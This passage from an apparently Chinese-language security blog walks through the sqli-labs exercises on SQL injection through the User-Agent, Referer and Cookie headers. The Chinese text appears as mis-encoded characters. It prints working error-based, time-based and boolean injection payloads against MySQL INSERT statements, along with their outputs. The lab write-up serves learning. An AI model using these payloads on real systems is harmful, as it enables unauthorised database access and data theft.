10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142Safari/537.36ã€‚è¿™é‡Œæƒ³è¯´ User-Agentçš„åŸå§‹æ•°æ®ä¸è¦æ”¹å§ï¼Œä¸‡ä¸€åˆ¤æ–­é•¿åº¦ä»€ä¹ˆçš„ï¼Œæ”¹çŸ­äº†å†å‡ºåˆ«çš„äº‹æƒ…äº†ï¼ˆæ€»ä¹‹ï¼Œçœ‹ä½ è‡ªå·±äº†ã€‚ï¼‰</p><h3 id="æµ‹è¯•æŠ¥é”™æ³¨å…¥">æµ‹è¯•æŠ¥é”™æ³¨å…¥</h3><p>paylaod:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span><span class="string">&#x27;, (select 1 and extractvalue(1,concat(0x23,(select version())))),(select 1))#</span></span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œæˆ‘ä¸€å¼€å§‹ä½¿ç”¨çš„æ³¨é‡Šæ˜¯ -- ï¼Œä½†æ˜¯ä¸ç®¡ç”¨ï¼ˆphpç»™æˆ‘æŠŠç©ºæ ¼å»æ‰äº†ï¼Œæˆ‘åœ¨ mysql æ‰§è¡Œè¯¥ payloadç”Ÿæˆçš„è¯­å¥å°±å¯ä»¥ï¼‰ï¼Œäºæ˜¯æ¢æˆäº† #</p><p>å›æ˜¾ï¼šXPATH syntax error: '#5.5.53'</p><p>æµ‹è¯•æˆåŠŸï¼Œåé¢çš„æ­¥éª¤ä¸æ–¹æ³•ä½ æ‡‚å¾—ã€‚</p><p>å­¦ä¹ äº† mysql æ³¨å…¥å¤©ä¹¦å¯¹æœ¬èŠ‚çš„æ³¨å…¥æµç¨‹åï¼Œæˆ‘å‘ç°æœ‰å¦ä¸€ç§æ„é€ æ–¹å¼ã€‚</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#x27;1</span><br></pre></td></tr></table></figure><p>å®é™…æ‰§è¡Œçš„è¯­å¥ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`)</span><br><span class="line">VALUES (&#x27;&#x27;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#x27;1&#x27;, &#x27;192.168.107.1&#x27;, &#x27;admin&#x27;)</span><br></pre></td></tr></table></figure><p>æ­¤ payload ä»¥ä¸æ”¹å˜å…¶ä»–å­—æ®µå†…å®¹ä¸ºå‡ºå‘ç‚¹ï¼Œåˆ©ç”¨ and è¿æ¥å¸ƒå°”å€¼ï¼Œè¿”å›å¸ƒå°”å€¼ï¼Œè€Œå¸ƒå°”å€¼å¯ä»¥ä¸ 0 æˆ– 1è¿›è¡Œè‡ªåŠ¨è½¬æ¢çš„ç‰¹ç‚¹æ„é€ è€Œæˆã€‚ï¼ˆæ³¨ï¼šç©ºä¸²å¯ä»¥è‡ªåŠ¨è½¬åŒ–ä¸º 0 ä»¥åŠå¸ƒå°”å€¼falseï¼‰ã€‚</p><p>ä¸‹é¢è¯å®æˆ‘çš„è¯´æ³•</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> temp <span class="keyword">values</span>(<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>,<span class="string">&#x27;me&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> temp;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> uname <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> <span class="keyword">user</span>  <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> green <span class="operator">|</span> pwd      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> me    <span class="operator">|</span> pwd      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> temp <span class="keyword">values</span>(<span class="string">&#x27;&#x27;</span><span class="keyword">and</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>,<span class="string">&#x27;me&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> temp;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> uname <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> <span class="keyword">user</span>  <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> green <span class="operator">|</span> pwd      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span> me    <span class="operator">|</span> pwd      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> me    <span class="operator">|</span> pwd      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>å¦ä¸€ä¸ª payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and updatexml(1,concat(0x7e,(select user()),0x7e),1),1,1)#</span></span><br></pre></td></tr></table></figure><p>æ€æƒ³ä¸ä¸Šé¢æœ‰å…±åŒä¹‹å¤„ï¼Œå°±ä¸å†è®²è§£ã€‚</p><p>å°ç»“ï¼š æ„é€  payload ä¸¤ç§æ€è·¯</p><ol type="1"><li>åªç ´åï¼ˆä½¿ç”¨ï¼‰è¯¥å­—æ®µï¼Œé—­åˆå‰å•å¼•å·ï¼Œä½¿ç”¨ andæ¥ä¸å‰é¢çš„å•å¼•å·ç»„æˆä¸€ä¸ªå­—æ®µä¸‹ and çš„è¿ç®—æ•°ï¼ŒåŒæ—¶å†ä½¿ç”¨ä¸€ä¸ª and '1æ¥é—­åˆè¯¥å­—æ®µåŸæ¥åå•å¼•å·ã€‚</li><li>é—­åˆè¯¥å­—æ®µï¼Œå†åé¢è‡ªå·±æ„é€ ä¸€ä¸ªå­—æ®µç”¨æ¥æ³¨å…¥</li></ol><h3 id="æµ‹è¯•å¸ƒå°”ç›²æ³¨">æµ‹è¯•å¸ƒå°”ç›²æ³¨</h3><p>Mozilla/5.0', (select 1),(select 1)) and 1=1# æŠ¥é”™ã€‚</p><p>æŠ¥é”™åŸå› ï¼š ä¹‹å‰æˆ‘ä»¬å¯ä»¥ç”¨ and 1=1 æˆ– and 1=2 æµ‹è¯•å¸ƒå°”ç›²æ³¨çš„åŸå› æ˜¯where ä¸ and çš„è¿ç”¨ã€‚ 'where id =1 and 1=2' ä¸­çš„ and çš„è¿ç®—æ•°åˆ†åˆ«ä¸ºï¼šid=1 ä¸ 1=2ï¼ŒäºŒè€…å‡ä¸ºå¸ƒå°”å€¼ã€‚æ•°æ®åº“éå†æ¯æ¡æ•°æ®ï¼ŒæŸ¥è¯¢å‡ºæ»¡è¶³ id=1 ä¸” 1=2çš„æ•°æ®ã€‚</p><p>è€Œç°åœ¨æ˜¯ insert into è¯­å¥ï¼Œandä¸¤ä¾§è¦æ±‚ä¸ºå¸ƒå°”å€¼ï¼Œè€Œæ­¤æ—¶æ˜¾ç„¶ä¸æ»¡è¶³ï¼Œæ‰€ä»¥æŠ¥ andé‚£é‡Œçš„é”™ã€‚è¿™é‡Œæˆ‘ä»¬çŸ¥é“åœ¨æ’å…¥è¯­å¥ insertä½¿ç”¨å¸ƒå°”ç›²æ³¨æ˜¯ä¸å¤ªå¥½å®ç°çš„ã€‚å› ä¸ºä½ æ²¡æœ‰åŠæ³•é€šè¿‡æ”¹å˜ä½ æ’å…¥çš„ payloadæ¥æ”¹å˜é¡µé¢æŠ¥é”™ä¸å¦ã€‚</p><p>æ¯”å¦‚ï¼šMozilla/5.0', ((select 1) andsleep(3)),(select((if(left(version(),1)&gt;4,1,0)))))#åŸæœ¬æ­£å¸¸æƒ…å†µä¸‹ï¼Œä½ ä½¿ç”¨åˆ¤æ–­ç‰ˆæœ¬æ¯ä¸ªå­—ç¬¦è¿”å›çš„çœŸå‡æ¥æ§åˆ¶é¡µé¢æ­£å¸¸ä¸å¦ï¼Œè€Œåœ¨ insertè¯­å¥ä¸­ï¼Œè¯¥çœŸå‡åªæ˜¯è¢«æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œä½ å¹¶çœ‹ä¸åˆ°å®ƒï¼Œå› æ­¤é¡µé¢ä¸€ç›´æ˜¾ç¤ºæ­£å¸¸ã€‚</p><p>è¿™é‡Œæ²¡æœ‰å‡ºé”™ç‚¹ä½¿ä½ çš„é¡µé¢éšç€ä½ çš„åˆ¤æ–­å­—ç¬¦å¤§å°å˜åŒ–ã€‚å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥æ„é€ éšç€ä½ çš„åˆ¤æ–­æ­£è¯¯è€ŒæŠ¥é”™ä¸å¦çš„è¯­å¥ï¼Œè¦æ„é€ çš„è¯ï¼Œå°±éœ€è¦ç”¨åˆ°ä¸€äº›æŠ¥é”™ï¼Œæ‰€ä»¥ä¸çŸ¥é“è¿™ç®—å¸ƒå°”ç›²æ³¨è¿˜æ˜¯ç®—æŠ¥é”™ç›²æ³¨ï¼Œç…§æˆ‘æ¥è¯´ï¼Œè¿˜æ˜¯ç®—å¸ƒå°”ç›²æ³¨ï¼Œå› ä¸ºæŠ¥é”™ç›²æ³¨æ˜¯æŒ‡é€šè¿‡æŠ¥é”™æŠŠæ•æ„Ÿä¿¡æ¯ç›´æ¥æ˜¾ç¤ºå‡ºæ¥ã€‚</p><p>ä¸‹é¢ç»™å‡ºä¸€ä¸ª payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span><span class="string">&#x27;, (select 1),(select (if(left(version(),1)&gt;5,1,0))=1 or pow(999,999)))#</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨äº† double æº¢å‡ºæŠ¥é”™ä¸ or çš„çŸ­è·¯ç‰¹æ€§</p><p>å½“ç„¶ï¼Œå®é™…æ¸—é€è¿‡ç¨‹ä¸­ï¼Œæœ‰æ­£è§„çš„æŠ¥é”™æ³¨å…¥ç‚¹ï¼Œæˆ‘ä»¬å°±ä¸ç”¨æµ‹å¸ƒå°”ç›²æ³¨äº†ã€‚æˆ‘è¿™é‡Œè‡ªå·±æ„é€  payload åªæ˜¯å› ä¸ºæ„é€ æœ‰æ•ˆçš„ payload è®©äººå¿«ä¹ï¼Œhaha</p><p>è¿™é‡Œæˆ‘é‡åˆ°ä¸€ä¸ªåšæ–‡å†™çš„ User-agentæ³¨å…¥ï¼Œä½¿ç”¨æ­£å¸¸çš„å¸ƒå°”ç›²æ³¨ã€‚è¦æ˜¯æ•°æ®åº“è¯­å¥ä¹Ÿæ˜¯ insert intoçš„è¯ï¼Œé‚£å°±å¥‡æ€ªäº†ã€‚å½“ç„¶ï¼Œå’±ä¹Ÿä¸çŸ¥é“ sql è¯­å¥æ˜¯å•¥ï¼Œç»™å‡ºé“¾æ¥ä»…ä¾›å‚è€ƒã€‚</p><p><ahref="https://medium.com/@frostnull/sql-injection-through-user-agent-44a1150f6888">SQLinjection through User-Agent</a></p><h3 id="æµ‹è¯•æ—¶é—´ç›²æ³¨">æµ‹è¯•æ—¶é—´ç›²æ³¨</h3><p>æ„é€  payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span><span class="string">&#x27;, ((select 1) and sleep(3)),(select 1)) #</span></span><br></pre></td></tr></table></figure><p>å»¶æ—¶æˆåŠŸ</p><p>ä¸‹é¢ç»™å‡ºåç»­æ—¶é—´ç›²æ³¨ payload ç¤ºä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span><span class="string">&#x27;, (select 1),(select((if(left(version(),1)&gt;5,1,sleep(3))))))#</span></span><br></pre></td></tr></table></figure><h1 id="referer-æ³¨å…¥">referer æ³¨å…¥</h1><h2 id="ç®€ä»‹">ç®€ä»‹</h2><blockquote><p>HTTP æ¥æºåœ°å€ï¼ˆ<strong>referer</strong>ï¼Œæˆ– <strong>HTTPreferer</strong>ï¼‰æ˜¯ HTTPè¡¨å¤´çš„ä¸€ä¸ªå­—æ®µï¼Œç”¨æ¥<strong>è¡¨ç¤ºä»å“ªå„¿é“¾æ¥åˆ°ç›®å‰çš„ç½‘é¡µ</strong>ï¼Œé‡‡ç”¨çš„æ ¼å¼æ˜¯URLã€‚æ¢å¥è¯è¯´ï¼Œå€Ÿç€ HTTPæ¥æºåœ°å€ï¼Œç›®å‰çš„ç½‘é¡µå¯ä»¥æ£€æŸ¥è®¿å®¢ä»å“ªé‡Œè€Œæ¥ï¼Œè¿™ä¹Ÿå¸¸è¢«ç”¨æ¥å¯¹ä»˜ä¼ªé€ çš„è·¨ç½‘ç«™è¯·æ±‚ã€‚</p></blockquote><h2 id="æ£€æµ‹æ³¨å…¥ç‚¹">æ£€æµ‹æ³¨å…¥ç‚¹</h2><p>è¿™ä¸€æ­¥ä¸è¿›è¡Œäº†ï¼Œå› ä¸ºéƒ½çŸ¥é“æ˜¯ referer æ³¨å…¥äº†ã€‚</p><p>ç›®å‰æ¥çœ‹ï¼Œæ£€æµ‹æ³¨å…¥ç‚¹é¡ºåºï¼šåœ°å€æ -&gt;æœç´¢æ -&gt;ç™»å½•æ -&gt;httpå¤´éƒ¨ï¼ˆUser-Agent-&gt;referer-&gt;cookieï¼‰</p><h2 id="æ£€æµ‹æ³¨å…¥ç±»å‹">æ£€æµ‹æ³¨å…¥ç±»å‹</h2><p>åŠ ä¸ªå•å¼•å·ï¼Œraw ä¸­å›æ˜¾æŠ¥é”™ï¼š</p><p>You have an error in your SQL syntax; check the manual thatcorresponds to your MySQL server version for the right syntax to usenear '192.168.107.1')' at line 1</p><p>æ³¨ï¼šrepeater ä¸­çš„ raw å’Œ render è¦å¯¹æ¯”ç€çœ‹ï¼Œæ­£å¦‚å‰é¢æ‰€è¯´ï¼Œrawä¸­æœ‰äº›å­—ç¬¦ä¸æ˜¾ç¤ºã€‚</p><p>render ä¸­æŸ¥çœ‹ï¼Œ</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/less19_render.png"alt="render" /><figcaption aria-hidden="true">render</figcaption></figure><p>è¯´æ˜å­˜åœ¨æ³¨å…¥ï¼Œæ ¹æ® render çš„é¡µé¢æˆ‘ä»¬å°±å¯ä»¥æ›´åŠ æ¸…æ¥šåœ°åˆ¤æ–­åå° sqlæŸ¥è¯¢è¯­å¥ã€‚</p><p>äºæ˜¯æˆ‘ä»¬çŸ¥é“ refererã€ipä¸¤ä¸ªå­—æ®µï¼Œå¹¶ä¸”å®ƒä»¬åˆ†åˆ«ç”¨å•å¼•å·åŒ…è£¹ã€‚è¿™æ ·æˆ‘ä»¬å¯ä»¥æ²¿ç”¨ user agentçš„æ³¨å…¥æ€è·¯ï¼šåªä½¿ç”¨ï¼ˆç ´åï¼‰è¯¥æ³¨å…¥å­—æ®µï¼ˆå³ï¼šreferer ï¼‰æˆ–è€…é—­åˆrefererï¼Œä½¿ç”¨å…¶åé¢çš„å­—æ®µã€‚</p><p>ä¸‹é¢æµ‹è¯•ä¸‰ç§ç›²æ³¨ã€‚</p><h3 id="æµ‹è¯•æŠ¥é”™æ³¨å…¥-1">æµ‹è¯•æŠ¥é”™æ³¨å…¥</h3><h4 id="æ£€æµ‹ç‰ˆæœ¬">æ£€æµ‹ç‰ˆæœ¬</h4><p>æ ¹æ®ä¸Šé¢åªä½¿ç”¨ï¼ˆç ´åï¼‰ä¸€ä¸ªå­—æ®µçš„æ€æƒ³ï¼Œè€Œä¸”ä¹Ÿåªæœ‰ä¸€ä¸ªå­—æ®µè®©æˆ‘ä»¬ç”¨ï¼Œæ„é€ ä¸€ä¸‹paylaod</p><p>payloadï¼ˆåŠ åœ¨ referer åé¢ï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,(extractvalue(1,concat(0x23,(select version()))))) #</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼šXPATH syntax error: '#5.5.53' æˆåŠŸäº†ï¼ŒæŠ¥é”™æ³¨å…¥å¯è¡ŒæˆåŠŸ</p><h3 id="æµ‹è¯•å»¶æ—¶æ³¨å…¥">æµ‹è¯•å»¶æ—¶æ³¨å…¥</h3><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,(select 1 from (select sleep(20))a)) #</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®äººå¯¹è¿”å›æ—¶é—´çš„æ„Ÿè§‰ï¼Œå½“ç„¶ï¼Œburp çš„ repeaterå¯ä»¥çœ‹å“åº”æ—¶é—´ï¼Œåœ¨å³ä¸‹è§’ï¼Œå†™ç€å¤šå°‘æ¯«ç§’å‘¢ã€‚å»¶æ—¶æ³¨å…¥æˆåŠŸã€‚</p><h3 id="æµ‹è¯•å¸ƒå°”æ³¨å…¥">æµ‹è¯•å¸ƒå°”æ³¨å…¥</h3><p>å¸ƒå°”æ³¨å…¥çš„æƒ…å†µä¸å‰é¢ insert user agent ä¸€æ ·ã€‚</p><h1 id="cookie-æ³¨å…¥">cookie æ³¨å…¥</h1><h2 id="ç®€ä»‹-1">ç®€ä»‹</h2><blockquote><p>cookie å°±æ˜¯æµè§ˆå™¨å‚¨å­˜åœ¨ç”¨æˆ·ç”µè„‘ä¸Šçš„ä¸€å°æ®µæ–‡æœ¬æ–‡ä»¶ã€‚cookieæ˜¯çº¯æ–‡æœ¬æ ¼å¼ï¼Œä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œçš„ä»£ç ã€‚ä¸€ä¸ª Webé¡µé¢æˆ–æœåŠ¡å™¨å‘ŠçŸ¥æµè§ˆå™¨æŒ‰ç…§ä¸€å®šè§„èŒƒæ¥å‚¨å­˜è¿™äº›ä¿¡æ¯ï¼Œå¹¶åœ¨éšåçš„è¯·æ±‚ä¸­å°†è¿™äº›ä¿¡æ¯å‘é€è‡³æœåŠ¡å™¨ï¼ŒWebæœåŠ¡å™¨å°±å¯ä»¥ä½¿ç”¨è¿™äº›ä¿¡æ¯æ¥è¯†åˆ«ä¸åŒçš„ç”¨æˆ·ã€‚å¤§å¤šæ•°éœ€è¦ç™»å½•çš„ç½‘ç«™åœ¨ç”¨æˆ·éªŒè¯æˆåŠŸä¹‹åéƒ½ä¼šè®¾ç½®ä¸€ä¸ªcookieï¼Œåªè¦è¿™ä¸ª cookieå­˜åœ¨å¹¶å¯ä»¥ï¼Œç”¨æˆ·å°±å¯ä»¥è‡ªç”±æµè§ˆè¿™ä¸ªç½‘ç«™çš„ä»»æ„é¡µé¢ã€‚å†æ¬¡è¯´æ˜ï¼ŒcookieåªåŒ…å«æ•°æ®ï¼Œå°±å…¶æœ¬èº«è€Œè¨€å¹¶ä¸æœ‰å®³ã€‚</p></blockquote><p>cookie æ³¨å…¥</p><p>é¦–å…ˆä½¿ç”¨æ­£ç¡®çš„ç”¨æˆ·åä¸å¯†ç ç™»å½•ï¼Œæ­¤æ—¶æˆ‘ä»¬è·å¾— cookie ï¼šuname=admin</p><p>ä¸‹é¢å¯¹ cookie è¿›è¡Œæ³¨å…¥ï¼Œä¸ä¸Šé¢æ³¨å…¥ç±»ä¼¼ï¼Œä¸‹é¢ç»™å‡º payload ç¤ºä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&#x27;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span></span><br></pre></td></tr></table></figure><p>cookie æ³¨å…¥éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼šcookie çš„æ ¼å¼ï¼šname=valueï¼Œæ¯”å¦‚è¿™é‡Œï¼šcookieå°±æ˜¯ uname=åé¢ä¸€å †ã€‚</p><p>sqli-lab ç¬¬ 21 å…³ï¼šæˆ‘ä»¬æŸ¥çœ‹ cookieå¯ä»¥çœ‹åˆ°ï¼Œæ˜æ˜¾æ˜¯è¢«ç¼–ç äº†çš„ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬çŒœæµ‹ç¼–ç æ–¹å¼ä¸º base64ï¼Œï¼ˆä¸ºä»€ä¹ˆçŒœæµ‹æ˜¯å®ƒå‘¢ï¼Ÿ1. å¸¸ç”¨ 2. ç»éªŒï¼‰ï¼Œç„¶åå’Œ 20å…³ç›¸åŒï¼Œåªæ˜¯æˆ‘ä»¬æ„é€ å®Œ cookie çš„ payloadï¼Œç”¨ base64 ç¼–ç ä¸€ä¸‹å°±å¥½äº†ã€‚</p><p>sqli-lab ç¬¬ 22 å…³ï¼šæœ‰äº† 21 å…³çš„åŸºç¡€ï¼Œæˆ‘ä»¬å…ˆè§£å¯†æŠ“åŒ…æˆ–åœ¨å¼€å‘è€…å·¥å…·æ‰¾çš„cookieï¼Œç„¶åè¿›è¡Œæ£€æµ‹åŠ ä¸€ä¸ªå•å¼•å·ï¼Œä¸æŠ¥é”™ï¼Œæ¢æˆåŒå¼•å·ï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š</p><blockquote><p><strong>Issue with your mysql: You have an error in your SQL syntax;check the manual that corresponds to your MySQL server version for theright syntax to use near '"admin"" LIMIT 0,1' at line 1</strong></p></blockquote><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥çŸ¥é“ cookie ç”±åŒå¼•å·åŒ…è£¹ã€‚å…¶ä½™çš„å’Œ 21 å…³ä¸€æ ·ã€‚</p><h1 id="æ€»ç»“å›é¡¾">æ€»ç»“å›é¡¾</h1><ol type="1"><li><p>å·¥å…·çš„ç¼ºç‚¹ï¼šhackbar ä¸èƒ½ç”¨ referer å¤´ï¼Œburp suite repeater çš„ rawä¸­ä¸æ˜¾ç¤ºä¸€äº›ç‰¹å®šå­—ç¬¦ï¼Œéœ€è¦åŒæ—¶å‚è€ƒ renderã€‚</p></li><li><p>chrome æ¨èä½¿ç”¨è°·æ­Œå•†åº—é‡Œé‚£ä¸ªï¼Œå›¾æ ‡ä¸ºé»‘è‰²åº•è‰²æœ‰ä¸€ä¸ªç™½è‰² H çš„hackbar ï¼ˆOffered by: 0140454ï¼‰å¯ä»¥ä¿®æ”¹ refererï¼ŒæŒºå¥½ã€‚</p></li><li><p>hackbar æœ‰ burp æ’ä»¶äº†ï¼Œåœ¨ githubä¸Šå¯ä»¥æ‰¾åˆ°ï¼Œè¿™æ ·æœ‰å®Œç¾äº†ï¼Œå¯ä»¥åªä½¿ç”¨ä¸€ç§å·¥å…·äº†ï¼šæµè§ˆå™¨ï¼ˆhackbaræµè§ˆå™¨æ’ä»¶ï¼‰æˆ– burp+hackbarï¼ˆburp æ’ä»¶ï¼‰æ¥æµ‹è¯•ã€‚å…¶ä¸­ hackbaræµè§ˆå™¨æ’ä»¶çš„æ·»åŠ  headeræ—¶ï¼Œå¯ä»¥ç›´æ¥è¾“å…¥åæ¥æœç´¢ï¼Œç„¶åé€‰æ‹©å°±è¡Œã€‚</p></li></ol><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/27553821">æµ…è°ˆ httpå¤´æ³¨å…¥(é™„æ¡ˆä¾‹)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¯¹æ£€æµ‹æ³¨å…¥ç‚¹çš„å°æƒ³æ³•</title>
      <link href="/blog/2019/07/29/websec/sql_injection/View%20of%20the%20injection%20point/"/>
      <url>/blog/2019/07/29/websec/sql_injection/View%20of%20the%20injection%20point/</url>
      
        <content type="html"><![CDATA[<h1 id="less-2">less 2</h1><h2 id="æ£€æµ‹æ³¨å…¥ç‚¹">æ£€æµ‹æ³¨å…¥ç‚¹</h2><p>é¦–å…ˆå…ˆç”¨å•å¼•å·ï¼Œæ£€æµ‹æ³¨å…¥ç‚¹ã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“æˆ‘ä»¬åœ¨ id=1åé¢åŠ ä¸œè¥¿çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯ä¸ºäº†åˆ¤æ–­ç³»ç»Ÿæ˜¯å¦ä¼šæ··æ·†æ•°æ®ä¸ä»£ç ï¼Œå°†æˆ‘ä»¬è¾“å…¥çš„<strong>åœ¨æŸç§æƒ…å†µä¸‹</strong>æœ¬å¯ä»¥ä½œä¸ºä»£ç æ‰§è¡Œçš„ç¬¦å·æ€ä¹ˆå¤„ç†ï¼Ÿ</p><p>å½“ç„¶å¤„ç†æ–¹å¼ä¸å¤–ä¹ä¸¤ç§</p><ol type="1"><li>é€šè¿‡è½¬ä¹‰ã€æ£€æµ‹å…³é”®å­—ç­‰æ‰‹æ®µå°†ä»£ç è½¬æ¢ä¸ºæ— å®³çš„æ•°æ®</li><li>å¤„ç†ä¸å½“ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†å¯ä»¥è¢«å½“åšä»£ç æ‰§è¡Œï¼Œæˆ‘ä»¬ sqlæ³¨å…¥ä¾¿æ˜¯æºè‡ªäºæ­¤ã€‚</li></ol><p>ä¸ºä»€ä¹ˆå¾ˆå¤šäººéƒ½è¯´å…ˆç”¨å•å¼•å·åˆ¤æ–­æ³¨å…¥ç‚¹å‘¢ï¼Œæˆ‘è®¤ä¸ºæ˜¯å› ä¸º id=1 ã€id= '1'ã€id=('1')çš„å¼€å‘è¯­å¥ç”¨çš„æ¯”è¾ƒå¤šï¼Œé€šè¿‡å•å¼•å·ä»¥åŠæŠ¥é”™å¯ä»¥æ˜ç¡®åœ°åŒºåˆ†å®ƒä»¬ã€‚</p><p>æ¯”å¦‚ä¸‰ç§æŠ¥é”™ï¼š' LIMIT 0,1ã€'1'' LIMIT 0,1ã€'1'') LIMIT 0,1</p><p>å¦‚æœä½¿ç”¨å·¦æ‹¬å·å‘¢ï¼Ÿid=('1)')</p><p>id=1 ã€id= '1' ã€id=('1') åˆ†åˆ«æŠ¥é”™ï¼š) LIMIT 0,1ã€'1)' LIMIT0,1ã€Unknown column 'id' in 'where clause'.</p><p>è¿™æ ·ä¹Ÿæ¯”è¾ƒå®¹æ˜“åŒºåˆ†, ä½†æ˜¯ï¼Œï¼ˆåœ¨ less 3ä¸­ä½¿ç”¨æœ‰å¼•å·ç«Ÿç„¶æ­£å¸¸è¿”å›ï¼Œæˆ‘è¦åäº†..ï¼‰ç»è¿‡ä¸€é˜µæŠ˜è…¾ï¼Œæˆ‘å‘ç°è¿™æ ·ä¸€æ¡è¯­å¥ï¼šSELECT * FROM users 